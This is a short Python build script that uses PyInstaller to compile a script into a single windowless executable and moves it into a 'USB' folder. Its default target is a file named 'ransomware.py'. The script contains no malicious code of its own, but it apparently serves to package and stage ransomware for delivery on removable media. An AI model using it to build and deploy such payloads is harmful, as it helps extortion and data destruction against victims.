import os
import subprocess
import shutil

current_path = os.path.abspath(r".")

def convert_to_exe(py_file):
    if not os.path.isfile(py_file):
        print("Error: The specified Python file does not exist.")
        return

    command = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        py_file
    ]

    try:
        subprocess.run(command, check=True)
        print(f"\nSuccessfully converted {py_file} to .exe.")
        print("File Successfully Generated")
        
        origin = os.path.join("dist", os.path.basename(py_file).replace(".py", ".exe"))
        origin = os.path.join(current_path, origin)
        destination = os.path.join("USB", os.path.basename(py_file).replace(".py", ".exe"))
        destination = os.path.join(current_path, destination)
        
        try:
            shutil.move(origin, destination)
            print(f"Check the 'USB' directory for the .exe file.")
        except Exception as e:
            print(f"Failed to move file: {e}\nCheck the 'dist' directory for the .exe file.")

    except subprocess.CalledProcessError as e:
        print("Error during conversion:", e)

def find_py_file():
    # Enter path automatically
    py_file = r"ransomware.py"
    
    py_file = os.path.join(current_path, py_file)

    if(os.path.isfile(py_file)):
        return py_file
    else:
        # If path is not set in this .py file
        for file in os.listdir(current_path):
            if file.endswith(r".py") and file != r"convert_py_to_exe.py":
                py_file = os.path.join(current_path, file)
    
    if(os.path.isfile(py_file)):
        return py_file
    else:
        # Enter Manually if no .py file is found
        for x in range(6):    
            py_file = input("Enter the path to your Python (.py) file: ").strip()
            if os.path.isfile(py_file):
                return py_file
            else:
                print(f"Error: The specified Python file does not exist.\n{5-x} tries left")
        return None

if __name__ == "__main__":
    py_file = find_py_file()
    convert_to_exe(py_file)
